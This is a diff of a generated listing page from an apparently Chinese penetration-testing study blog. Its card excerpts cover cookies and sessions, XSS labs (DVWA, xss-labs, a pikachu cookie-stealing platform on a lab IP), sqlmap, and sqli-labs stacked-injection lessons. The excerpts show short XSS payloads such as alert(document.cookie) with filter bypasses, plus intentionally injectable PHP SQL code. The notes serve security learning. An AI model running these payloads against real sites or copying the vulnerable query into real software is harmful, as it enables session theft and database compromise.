@@ -365,51 +365,26 @@
             
             <div class="article col s12 m6 l4" data-aos="zoom-in">
                 <div class="card">
-                    <a href="../../2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-2-1.2.1-ji-suan-ji-ying-jian-zu-cheng-cpu/">
+                    <a href="../../2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/11xss/fu-wu-qi-duan-session/">
                         <div class="card-image">
                             
                             
-                            <img src="../../medias/featureimages/21.jpg" class="responsive-img" alt="课时2-1.2.1-计算机硬件组成-CPU">
+                            <img src="../../medias/featureimages/0.jpg" class="responsive-img" alt="">
                             
-                            <span class="card-title">课时2-1.2.1-计算机硬件组成-CPU</span>
+                            <span class="card-title"></span>
                         </div>
                     </a>
 
                     <div class="card-content article-content">
                         <div class="summary block-with-text">
                             
-                                
-
-
-计算机应用程序
-
-
-
-
-
-操作系统
-编译原理
-
-
-
-计算机网络
-
-
-
-
-计算机体系结构
-
-
-
-
-CPU/GPU
-内存/硬盘
-显示器/键盘
-
-
-
-CPUCentral Processing Unit (中央处理器/处理器)
-常见的电脑处
+                                Cookie的缺点 客户端存储量过大
+ 增加通信成本 
+解决办法把身份信息存储在服务器 
+用Cookie给客户端下发一个Session ID 
+PHP SESSINO ID 
+Java Session ID 
+session校验开启会话se
                             
                         </div>
                         <div class="publish-info">
@@ -431,18 +406,29 @@ CPUCentral Processing Unit (中央处理器/处理器)
             
             <div class="article col s12 m6 l4" data-aos="zoom-in">
                 <div class="card">
-                    <a href="../../2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-1-1.1-ji-suan-ji-fa-zhan-li-shi/">
+                    <a href="../../2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/11xss/ke-hu-duan-cookie/">
                         <div class="card-image">
                             
                             
-                            <img src="../../medias/featureimages/9.jpg" class="responsive-img" alt="课时1-1.1-计算机发展历史">
+                            <img src="../../medias/featureimages/0.jpg" class="responsive-img" alt="">
                             
-                            <span class="card-title">课时1-1.1-计算机发展历史</span>
+                            <span class="card-title"></span>
                         </div>
                     </a>
 
                     <div class="card-content article-content">
                         <div class="summary block-with-text">
+                            
+                                现状每一个请求都是独立的 
+问题需要重复鉴别身份 
+需求1保持会话 
+实现
+服务端给客户端下发标识
+
+
+cookie key/value格式的文本: name=wuya,id=99
+
+产生流程浏览器第一次访问服务器在响应中通过Set-Coo
                             
                         </div>
                         <div class="publish-info">
@@ -464,33 +450,22 @@ CPUCentral Processing Unit (中央处理器/处理器)
             
             <div class="article col s12 m6 l4" data-aos="zoom-in">
                 <div class="card">
-                    <a href="../../2022/12/25/shen-tou-ke-cheng-xue-xi/xue-xi-mu-lu/">
+                    <a href="../../2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/11xss/xss-fang-yu/">
                         <div class="card-image">
                             
                             
-                            <img src="../../medias/featureimages/9.jpg" class="responsive-img" alt="学习目录">
+                            <img src="../../medias/featureimages/0.jpg" class="responsive-img" alt="">
                             
-                            <span class="card-title">学习目录</span>
+                            <span class="card-title"></span>
                         </div>
                     </a>
 
                     <div class="card-content article-content">
                         <div class="summary block-with-text">
                             
-                                第一部分:基础与准备
-中华人民共和国网络安全法
-Linux操作系统
-计算机网络基础
-HTML(网安)
-PHP入门
-MySQL
-Python编程
-
-第二部分:渗透与攻防
-信息收集
-SQL注入的渗透与防御
-XSS相关渗透与防御
-CSRF渗透与防
+                                测试payload&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+&gt;&lt;script&gt
                             
                         </div>
                         <div class="publish-info">
@@ -499,12 +474,8 @@ CSRF渗透与防
                             </span>
                             <span class="publish-author">
                                 
-                                <i class="fas fa-bookmark fa-fw icon-category"></i>
-                                
-                                <a href="../../categories/%E7%9B%AE%E5%BD%95/" class="post-category">
-                                    目录
-                                </a>
-                                
+                                <i class="fas fa-user fa-fw"></i>
+                                fantasycat6
                                 
                             </span>
                         </div>
@@ -516,25 +487,344 @@ CSRF渗透与防
             
             <div class="article col s12 m6 l4" data-aos="zoom-in">
                 <div class="card">
-                    <a href="../../2022/12/24/hello-world/">
+                    <a href="../../2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/11xss/xss-jian-cha-yu-li-yong/">
                         <div class="card-image">
                             
                             
-                            <img src="../../medias/featureimages/12.jpg" class="responsive-img" alt="Hello World">
+                            <img src="../../medias/featureimages/0.jpg" class="responsive-img" alt="">
                             
-                            <span class="card-title">Hello World</span>
+                            <span class="card-title"></span>
                         </div>
                     </a>
 
                     <div class="card-content article-content">
                         <div class="summary block-with-text">
                             
-                                Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hex
+                                xsser主要特性同时使用GET和POST方法注入。 
+包括各种过滤器和绕过技术。 
+可以与命令行和GUI一起使用。 
+将提供攻击的详细统计数据。
+查看参数xsser -h
+
+参考 
+https://www.freebuf.com/sect
                             
                         </div>
                         <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-12-24
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-12-25
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fas fa-user fa-fw"></i>
+                                fantasycat6
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                </div>
+            </div>
+            
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
+                    <a href="../../2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/11xss/xss-ping-tai/">
+                        <div class="card-image">
+                            
+                            
+                            <img src="../../medias/featureimages/0.jpg" class="responsive-img" alt="">
+                            
+                            <span class="card-title"></span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary block-with-text">
+                            
+                                pikachu的XSS平台基于反射型GET获取Cookie源码http://192.168.70.130/pkxss/xcookie/cookie.php 
+payload1修改输入长度 
+&lt;script&gt;document.lo
+                            
+                        </div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-12-25
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fas fa-user fa-fw"></i>
+                                fantasycat6
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                </div>
+            </div>
+            
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
+                    <a href="../../2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/11xss/xss-labs/">
+                        <div class="card-image">
+                            
+                            
+                            <img src="../../medias/featureimages/0.jpg" class="responsive-img" alt="">
+                            
+                            <span class="card-title"></span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary block-with-text">
+                            
+                                搭建xss-labs源码https://github.com/do0dl3/xss-labs
+参考https://blog.csdn.net/wo41ge/article/details/107459332
+访问靶场http://192.1
+                            
+                        </div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-12-25
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fas fa-user fa-fw"></i>
+                                fantasycat6
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                </div>
+            </div>
+            
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
+                    <a href="../../2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/11xss/javascript-cao-zuo-cookie/">
+                        <div class="card-image">
+                            
+                            
+                            <img src="../../medias/featureimages/0.jpg" class="responsive-img" alt="">
+                            
+                            <span class="card-title"></span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary block-with-text">
+                            
+                                客户端读取cookiealert(document.cookie);
+
+
+
+客户端设置cookiedocument.cookie="username=wuya"; 
+
+
+
+修改 新建一个同名的cookie，覆盖原来的cookie（属性必需一
+                            
+                        </div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-12-25
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fas fa-user fa-fw"></i>
+                                fantasycat6
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                </div>
+            </div>
+            
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
+                    <a href="../../2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/11xss/dvwa-xss-ba-chang/">
+                        <div class="card-image">
+                            
+                            
+                            <img src="../../medias/featureimages/0.jpg" class="responsive-img" alt="">
+                            
+                            <span class="card-title"></span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary block-with-text">
+                            
+                                反射型Low&lt;script&gt;alert('xss')&lt;/script&gt;
+
+Midum大小写或者双写绕过 
+&lt;Script&gt;alert('xss')&lt;/script&gt;
+
+&lt;s&lt;scr
+                            
+                        </div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-12-25
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fas fa-user fa-fw"></i>
+                                fantasycat6
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                </div>
+            </div>
+            
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
+                    <a href="../../2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqlmap-an-zhuang-jiao-cheng/sqlmap-an-zhuang-jiao-cheng/">
+                        <div class="card-image">
+                            
+                            
+                            <img src="../../medias/featureimages/4.jpg" class="responsive-img" alt="SQLmap安装教程">
+                            
+                            <span class="card-title">SQLmap安装教程</span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary block-with-text">
+                            
+                                SQLmap安装教程
+sqlmap简介：
+sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MS-SQL,,MYSQL,ORACLE和POSTGRESQL。SQLMAP采用
+                            
+                        </div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-12-25
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fas fa-user fa-fw"></i>
+                                fantasycat6
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                </div>
+            </div>
+            
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
+                    <a href="../../2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less46/less53/">
+                        <div class="card-image">
+                            
+                            
+                            <img src="../../medias/featureimages/1.jpg" class="responsive-img" alt="less53">
+                            
+                            <span class="card-title">less53</span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary block-with-text">
+                            
+                                $id=$_GET['sort'];	
+
+$sql="SELECT * FROM users ORDER BY '$id'";
+/* execute multi query */
+if (mysqli_multi_query($con1, 
+                            
+                        </div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-12-25
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fas fa-user fa-fw"></i>
+                                fantasycat6
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                </div>
+            </div>
+            
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
+                    <a href="../../2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less46/less52/">
+                        <div class="card-image">
+                            
+                            
+                            <img src="../../medias/featureimages/2.jpg" class="responsive-img" alt="less52">
+                            
+                            <span class="card-title">less52</span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary block-with-text">
+                            
+                                $id=$_GET['sort'];	
+
+
+$sql="SELECT * FROM users ORDER BY $id";
+/* execute multi query */
+if (mysqli_multi_query($con1, $
+                            
+                        </div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-12-25
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fas fa-user fa-fw"></i>
+                                fantasycat6
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                </div>
+            </div>
+            
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
+                    <a href="../../2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less46/less51/">
+                        <div class="card-image">
+                            
+                            
+                            <img src="../../medias/featureimages/3.jpg" class="responsive-img" alt="less51">
+                            
+                            <span class="card-title">less51</span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary block-with-text">
+                            
+                                $id=$_GET['sort'];	
+
+$sql="SELECT * FROM users ORDER BY '$id'";
+/* execute multi query */
+if (mysqli_multi_query($con1, 
+                            
+                        </div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-12-25
                             </span>
                             <span class="publish-author">
                                 
@@ -566,11 +856,12 @@ CSRF渗透与防
             
         </div>
         <div class="page-info col m4 l4 hide-on-small-only">
-            <div class="center-align b-text-gray">17 / 17</div>
+            <div class="center-align b-text-gray">17 / 27</div>
         </div>
         <div class="col s6 m4 l4">
             
-            <a class="right btn-floating btn-large disabled">
+            <a href="../18/"
+               class="right btn-floating btn-large waves-effect waves-light bg-color">
                 <i class="fas fa-angle-right"></i>
             </a>
             
@@ -641,7 +932,7 @@ CSRF渗透与防
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
-                <span id="year">2022</span>
+                <span id="year">2022-2023</span>
             
             <span id="year">2022</span>
             <a href="../../about" target="_blank">fantasycat6</a>
@@ -650,7 +941,7 @@ CSRF渗透与防
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">96.5k</span>&nbsp;字
+                class="white-color">312.9k</span>&nbsp;字
             
             
             
